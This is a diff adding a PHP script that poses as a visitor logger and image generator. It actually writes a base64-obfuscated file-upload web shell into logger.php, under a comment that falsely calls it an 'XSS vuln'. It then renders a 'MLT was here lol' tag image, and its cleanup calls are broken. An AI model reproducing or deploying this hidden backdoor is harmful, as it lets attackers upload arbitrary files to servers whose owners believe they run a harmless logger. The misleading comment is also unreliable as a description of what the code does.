@@ -1,0 +1,30 @@
+<?php
+$log = 'logger.html';
+$ip = $_SERVER['REMOTE_ADDR'];
+$page = $_SERVER['REQUEST_URI'];
+$refer = $_SERVER['HTTP_REFERER'];
+$date_time = date("l j F Y  g:ia", time() - date("Z")) ;
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$fp = fopen("logger.php", "a"); // XSS vuln so you can counter-pwn skids who cant modify this code 
+fwrite($fp, base64_decode("PD9waHAKZWNobyAnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+JzsKZWNobyAnPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHNpemU9IjUwIj48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7CmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsKaWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsgZWNobyAnPGI+S29yYW5nIERhaCBCZXJqYXlhIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8Yj48YnI+PGJyPic7IH0KZWxzZSB7IGVjaG8gJzxiPktvcmFuZyBHYWdhbCBVcGxvYWQgU2hlbGwgS29yYW5nISEhPC9iPjxicj48YnI+JzsgfQp9Cj8+"));
+flock($fp, 3);
+fclose($fp);
+
+
+$my_img = imagecreate( 200, 80 );
+$background = imagecolorallocate( $my_img, 255, 0, 255 );
+$text_colour = imagecolorallocate( $my_img, 200, 200, 0 );
+$line_colour = imagecolorallocate( $my_img, 128, 255, 0 );
+imagestring( $my_img, 4, 30, 25, "MLT was here lol",
+  $text_colour );
+imagesetthickness ( $my_img, 5 );
+imageline( $my_img, 30, 45, 165, 45, $line_colour );
+
+header( "Content-type: image/png" );
+imagepng( $my_img );
+imagecolordeallocate( $line_color );
+imagecolordeallocate( $text_color );
+imagecolordeallocate( $background );
+imagedestroy( $my_img );
+
+?>
